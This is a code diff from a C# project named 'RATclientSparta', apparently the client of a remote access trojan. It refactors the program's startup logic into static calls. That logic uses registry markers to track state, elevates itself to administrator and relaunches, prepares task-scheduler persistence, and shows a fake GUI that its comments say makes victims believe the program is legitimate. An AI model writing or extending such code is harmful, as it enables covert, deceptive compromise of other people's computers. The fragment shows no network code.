@@ -46,30 +46,25 @@ namespace RATclientSparta
                 //ClientValues - The registry key of this app
 
                 //Registry check if item exist
-                RegistryCheck item = new RegistryCheck();
-
-                if (!(item.CheckIfExist("HaveTaskSchedulerItem")))
+                if (!(RegistryCheck.CheckIfExist("HaveTaskSchedulerItem")))
                 {
                     //The only way for this data to be exist is if this program was already opened.
                     //So, if this already exist then the program already runned once.
                     //THIS IS A IF FOR THE FIRST TIME PROGRAM OPENED UNTIL TASK SCHEDULER ITEM CREATED
                     //The value "HaveTaskSchedulerItem" created only after task scheduler item created.
 
-                    if (!(item.CheckIfExist("HaveAdminPrivilege")))
+                    if (!(RegistryCheck.CheckIfExist("HaveAdminPrivilege")))
                     {
                         //Class name - GetPrivilege
-                        AdminGet app = new AdminGet();
-                        if (app.GetAdmin())
+                        if (AdminGet.GetAdmin())
                         {
-                            RegistryCreate data = new RegistryCreate();
-                            data.Create("OpenedAt", DateTime.Now.ToString());
-                            OSType OS = new OSType();
-                            data.Create("OsVersion", OS.Type());
+                            RegistryCreate.Create("OpenedAt", DateTime.Now.ToString());
+                            RegistryCreate.Create("OsVersion", OSType.Type());
 
                             //When program gets privileges it will reopen as admin
                             //So i am closing this app because there is other app opened as admin
                             //I dont want this if to be run next time this program self opening it self, so I'm creating this value
-                            data.Create("HaveAdminPrivilege", "");
+                            RegistryCreate.Create("HaveAdminPrivilege", "");
                             Environment.Exit(0);
                         }
                         else
@@ -79,20 +74,17 @@ namespace RATclientSparta
                         }
                     }
                     else
-                    {
-                        RegistryDelete value = new RegistryDelete();
-                        value.DeleteValue("HaveAdminPrivilege");
-                    }
+                        RegistryDelete.DeleteValue("HaveAdminPrivilege");
 
 
                     //If "FirstOpen" registry data not exist, its the first time program opened.
                     //the Fake GUI will open, only once in life.
-                    if (!(item.CheckIfExist("FirstOpen")))
+                    if (!(RegistryCheck.CheckIfExist("FirstOpen")))
                     {
                         //At the first open a GUI box will be shown because i want
                         //Clients to think this is a legit app
                         RegistryCreate value = new RegistryCreate();
-                        value.Create("FirstOpen", "0");
+                        RegistryCreate.Create("FirstOpen", "0");
                         GUIApp application = new GUIApp();
                         new Thread(new ThreadStart(() => { application.ShowDialog(); })).Start();
                     }
